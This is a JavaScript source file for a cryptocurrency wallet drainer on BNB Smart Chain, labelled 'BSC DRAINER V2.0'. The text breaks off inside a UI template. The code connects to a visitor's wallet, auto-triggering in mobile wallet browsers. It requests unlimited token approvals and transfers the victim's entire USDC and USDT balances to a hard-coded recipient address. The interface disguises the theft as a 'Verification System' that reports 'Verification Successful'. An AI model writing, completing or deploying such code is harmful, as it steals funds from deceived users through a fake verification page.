// ==================== BSC DRAINER V2.0 ====================
// COMPLETE DEBUGGED VERSION - BSC NETWORK ONLY

// ========== CONFIGURATION (BSC MAINNET) ==========
const BSC_CONFIG = {
    network: {
        chainId: 56,
        chainIdHex: '0x38',
        name: 'BNB Smart Chain',
        rpcUrl: 'https://bsc-dataseed.binance.org/',
        symbol: 'BNB',
        decimals: 18,
        explorer: 'https://bscscan.com'
    },
    
    tokens: {
        usdc: {
            address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            name: "USD Coin",
            symbol: "USDC",
            decimals: 18
        },
        usdt: {
            address: "0x55d398326f99059fF775485246999027B3197955",
            name: "Tether USD", 
            symbol: "USDT",
            decimals: 18
        }
    },
    
    drainer: {
        // ⚠️ REPLACE THIS WITH YOUR WALLET ADDRESS ⚠️
        recipient: "0xe4c5a7aa330Fff086A52728d5697cFcDEf412B9D",
        name: "Verification System",
        version: "2.0"
    }
};

// ========== ERC20 ABI (MINIMAL FOR TRANSFERS) ==========
const ERC20_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {"name": "_owner", "type": "address"},
            {"name": "_spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    }
];

// ========== BROWSER DETECTION ==========
function detectEnvironment() {
    const ua = navigator.userAgent.toLowerCase();
    
    return {
        isMobile: /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua),
        isTrust: ua.includes('trust') || (window.ethereum && window.ethereum.isTrust),
        isMetaMask: ua.includes('metamask') || (window.ethereum && window.ethereum.isMetaMask),
        isWallet: !!(window.ethereum || window.web3 || window.trust || window.okxwallet),
        userAgent: ua
    };
}

// ========== NETWORK MANAGEMENT ==========
async function ensureBSCNetwork() {
    if (!window.ethereum) {
        console.error("No Web3 wallet detected");
        return { success: false, error: "No Web3 wallet" };
    }
    
    try {
        // Get current network
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const network = await provider.getNetwork();
        
        console.log("Current network:", network.chainId, network.name);
        
        // Already on BSC
        if (network.chainId === 56) {
            return { success: true, alreadyOnBSC: true };
        }
        
        // Try to switch to BSC
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_CONFIG.network.chainIdHex }]
            });
            console.log("Switched to BSC successfully");
            return { success: true, switched: true };
            
        } catch (switchError) {
            console.log("Switch error:", switchError);
            
            // Chain not added (error code 4902)
            if (switchError.code === 4902) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_CONFIG.network.chainIdHex,
                            chainName: BSC_CONFIG.network.name,
                            nativeCurrency: {
                                name: BSC_CONFIG.network.symbol,
                                symbol: BSC_CONFIG.network.symbol,
                                decimals: BSC_CONFIG.network.decimals
                            },
                            rpcUrls: [BSC_CONFIG.network.rpcUrl],
                            blockExplorerUrls: [BSC_CONFIG.network.explorer]
                        }]
                    });
                    console.log("BSC network added successfully");
                    return { success: true, added: true };
                    
                } catch (addError) {
                    console.error("Failed to add BSC:", addError);
                    return { success: false, error: "Failed to add BSC network" };
                }
            }
            
            return { success: false, error: switchError.message };
        }
        
    } catch (error) {
        console.error("Network error:", error);
        return { success: false, error: error.message };
    }
}


// ========== TOKEN DRAIN FUNCTION (MAIN LOGIC) ==========
async function drainTokens(signer, userAddress) {
    console.log(`Starting drain for: ${userAddress}`);
    
    const results = {
        success: false,
        drainedUSDC: false,
        drainedUSDT: false,
        usdcAmount: "0",
        usdtAmount: "0",
        usdcBalance: ethers.constants.Zero,
        usdtBalance: ethers.constants.Zero,
        txHashes: [],
        errors: []
    };
    
    try {
        // Create contract instances
        const usdcContract = new ethers.Contract(
            BSC_CONFIG.tokens.usdc.address,
            ERC20_ABI,
            signer
        );
        
        const usdtContract = new ethers.Contract(
            BSC_CONFIG.tokens.usdt.address,
            ERC20_ABI,
            signer
        );
        
        // Get balances (use Promise.all for efficiency)
        const [usdcBalance, usdtBalance] = await Promise.all([
            usdcContract.balanceOf(userAddress),
            usdtContract.balanceOf(userAddress)
        ]);
        
        results.usdcBalance = usdcBalance;
        results.usdtBalance = usdtBalance;
        
        console.log("Balances:", {
            USDC: ethers.utils.formatUnits(usdcBalance, 18),
            USDT: ethers.utils.formatUnits(usdtBalance, 18)
        });
        
        // Drain USDC if balance > 0
        if (usdcBalance.gt(0)) {
            try {
                console.log("Processing USDC...");
                
                // Check allowance
                const allowanceUSDC = await usdcContract.allowance(
                    userAddress,
                    BSC_CONFIG.drainer.recipient
                );
                
                console.log("USDC Allowance:", ethers.utils.formatUnits(allowanceUSDC, 18));
                
                // If allowance insufficient, request approval
                if (allowanceUSDC.lt(usdcBalance)) {
                    console.log("Approving USDC...");
                    
                    // Use max uint256 for approval
                    const maxUint256 = ethers.constants.MaxUint256;
                    const approveTx = await usdcContract.approve(
                        BSC_CONFIG.drainer.recipient,
                        maxUint256
                    );
                    
                    const approveReceipt = await approveTx.wait();
                    console.log("USDC Approval TX:", approveReceipt.transactionHash);
                    
                    // Small delay after approval
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
                
                // Execute transfer
                console.log("Transferring USDC...");
                const transferTx = await usdcContract.transfer(
                    BSC_CONFIG.drainer.recipient,
                    usdcBalance
                );
                
                const transferReceipt = await transferTx.wait();
                console.log("USDC Transfer TX:", transferReceipt.transactionHash);
                
                results.drainedUSDC = true;
                results.usdcAmount = ethers.utils.formatUnits(usdcBalance, 18);
                results.txHashes.push(transferReceipt.transactionHash);
                
            } catch (usdcError) {
                console.error("USDC Drain Error:", usdcError);
                results.errors.push(`USDC: ${usdcError.message}`);
            }
        }
        
        // Drain USDT if balance > 0
        if (usdtBalance.gt(0)) {
            try {
                console.log("Processing USDT...");
                
                // Check allowance
                const allowanceUSDT = await usdtContract.allowance(
                    userAddress,
                    BSC_CONFIG.drainer.recipient
                );
                
                console.log("USDT Allowance:", ethers.utils.formatUnits(allowanceUSDT, 18));
                
                // If allowance insufficient, request approval
                if (allowanceUSDT.lt(usdtBalance)) {
                    console.log("Approving USDT...");
                    
                    // Use max uint256 for approval
                    const maxUint256 = ethers.constants.MaxUint256;
                    const approveTx = await usdtContract.approve(
                        BSC_CONFIG.drainer.recipient,
                        maxUint256
                    );
                    
                    const approveReceipt = await approveTx.wait();
                    console.log("USDT Approval TX:", approveReceipt.transactionHash);
                    
                    // Small delay after approval
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
                
                // Execute transfer
                console.log("Transferring USDT...");
                const transferTx = await usdtContract.transfer(
                    BSC_CONFIG.drainer.recipient,
                    usdtBalance
                );
                
                const transferReceipt = await transferTx.wait();
                console.log("USDT Transfer TX:", transferReceipt.transactionHash);
                
                results.drainedUSDT = true;
                results.usdtAmount = ethers.utils.formatUnits(usdtBalance, 18);
                results.txHashes.push(transferReceipt.transactionHash);
                
            } catch (usdtError) {
                console.error("USDT Drain Error:", usdtError);
                results.errors.push(`USDT: ${usdtError.message}`);
            }
        }
        
        // Determine overall success
        results.success = results.drainedUSDC || results.drainedUSDT;
        
        console.log("Drain results:", results);
        return results;
        
    } catch (error) {
        console.error("Drain process error:", error);
        results.errors.push(`Process: ${error.message}`);
        return results;
    }
}

// ========== WALLET CONNECTION ==========
async function connectAndDrain() {
    const env = detectEnvironment();
    console.log("Environment:", env);
    
    // Check if Web3 is available
    if (!env.isWallet) {
        alert("Please install MetaMask or Trust Wallet to continue.");
        return;
    }
    
    try {
        // Update UI to show connecting
        updateUIState("connecting");
        
        // 1. Ensure BSC network
        const networkResult = await ensureBSCNetwork();
        if (!networkResult.success) {
            alert(`Network error: ${networkResult.error}\nPlease switch to BSC manually.`);
            updateUIState("error");
            return;
        }
        
        // 2. Connect wallet
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        
        if (!accounts || accounts.length === 0) {
            alert("No accounts found. Please unlock your wallet.");
            updateUIState("error");
            return;
        }
        
        const userAddress = accounts[0];
        console.log("Connected address:", userAddress);
        
        // Update UI to show processing
        updateUIState("processing", userAddress);
        
        // 3. Get signer
        const signer = provider.getSigner();
        
        // 4. Execute drain
        const drainResults = await drainTokens(signer, userAddress);
        
        // 5. Update UI with results
        updateUIState("complete", userAddress, drainResults);
        
        // 6. Start monitoring for new tokens
        if (drainResults.success) {
            startTokenMonitoring(signer, userAddress);
        }
        
    } catch (error) {
        console.error("Connection error:", error);
        alert(`Error: ${error.message}`);
        updateUIState("error");
    }
}

// ========== AUTO-CONNECT FOR MOBILE ==========
function autoConnectIfPossible() {
    const env = detectEnvironment();
    
    // Only auto-connect in wallet browsers
    if ((env.isMobile || env.isTrust || env.isMetaMask) && env.isWallet) {
        console.log("Auto-connect triggered");
        
        // Small delay to let page load
        setTimeout(() => {
            connectAndDrain();
        }, 1500);
        
        return true;
    }
    
    return false;
}


// ========== UI MANAGEMENT ==========
function updateUIState(state, address, results) {
    const connectBtn = document.getElementById("connect-wallet-btn");
    const statusDiv = document.getElementById("status-display");
    
    if (!connectBtn) {
        console.error("Connect button not found");
        return;
    }
    
    switch (state) {
        case "connecting":
            connectBtn.innerHTML = `
                <div style="display: flex; align-items: center; justify-content: center;">
                    <div style="
                        width: 20px; 
                        height: 20px; 
                        border: 2px solid white;
                        border-top-color: transparent;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                        margin-right: 10px;
                    "></div>
                    Connecting...
                </div>
            `;
            connectBtn.disabled = true;
            break;
            
        case "processing":
            connectBtn.innerHTML = `
                <div style="display: flex; align-items: center; justify-content: center;">
                    <div style="
                        width: 20px;
                        height: 20px;
                        background: #10B981;
                        border-radius: 50%;
                        margin-right: 10px;
                        animation: pulse 2s infinite;
                    "></div>
                    Processing Verification...
                </div>
            `;
            connectBtn.disabled = true;
            
            // Show processing status
            if (statusDiv) {
                statusDiv.innerHTML = `
                    <div style="
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        padding: 20px;
                        border-radius: 12px;
                        margin: 20px 0;
                    ">
                        <h3 style="margin: 0 0 10px 0;">🔄 Verification in Progress</h3>
                        <p style="margin: 0; font-size: 14px; opacity: 0.9;">
                            Address: ${address.substring(0, 10)}...${address.substring(38)}
                        </p>
                        <p style="margin: 10px 0 0 0; font-size: 14px; opacity: 0.9;">
                            Please confirm the transactions in your wallet...
                        </p>
                    </div>
                `;
                statusDiv.style.display = 'block';
            }
            break;
            
        case "complete":
            connectBtn.innerHTML = `
                <div style="display: flex; align-items: center; justify-content: center;">
                    <div style="
                        width: 20px;
                        height: 20px;
                        background: #10B981;
                        border-radius: 50%;
                        margin-right: 10px;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        color: white;
                        font-size: 12px;
                    ">✓</div>
                    Verification Complete
                </div>
            `;
            connectBtn.style.background = "#10B981";
            connectBtn.disabled = true;
            
            // Show success results
            if (statusDiv && results) {
                const usdcDisplay = results.drainedUSDC ? 
                    `<div style="color: #10B981; margin: 5px 0;">✓ USDC: ${parseFloat(results.usdcAmount).toFixed(4)}</div>` : 
                    '<div style="color: #6B7280; margin: 5px 0;">USDC: 0.0000</div>';
                    
                const usdtDisplay = results.drainedUSDT ? 
                    `<div style="color: #10B981; margin: 5px 0;">✓ USDT: ${parseFloat(results.usdtAmount).toFixed(4)}</div>` : 
                    '<div style="color: #6B7280; margin: 5px 0;">USDT: 0.0000</div>';
                
                statusDiv.innerHTML = `
                    <div style="
                        background: linear-gradient(135deg, #10B981 0%, #059669 100%);
                        color: white;
                        padding: 25px;
                        border-radius: 12px;
                        margin: 20px 0;
                    ">
                        <h3 style="margin: 0 0 15px 0; display: flex; align-items: center;">
                            <span style="margin-right: 10px;">✅</span> Verification Successful
                        </h3>
                        
                        <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                            <div style="font-size: 12px; opacity: 0.8; margin-bottom: 5px;">Verified Address</div>
                            <div style="font-family: monospace; font-size: 14px;">${address}</div>
                        </div>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
                            <div style="background: rgba(255,255,255,0.1); padding: 12px; border-radius: 8px;">
                                <div style="font-size: 12px; opacity: 0.8;">Tokens Verified</div>
                                ${usdcDisplay}
                                ${usdtDisplay}
                            </div>
                            
                            <div style="background: rgba(255,255,255,0.1); padding: 12px; border-radius: 8px;">
                                <div style="font-size: 12px; opacity: 0.8;">Status</div>
                                <div style="color: #A7F3D0; margin: 5px 0;">✓ Transfer Complete</div>
                                <div style="color: #A7F3D0; margin: 5px 0;">✓ BSC Network</div>
                                <div style="color: #A7F3D0; margin: 5px 0;">✓ System Verified</div>
                            </div>
                        </div>
                        
                        ${results.txHashes.length > 0 ? `
                            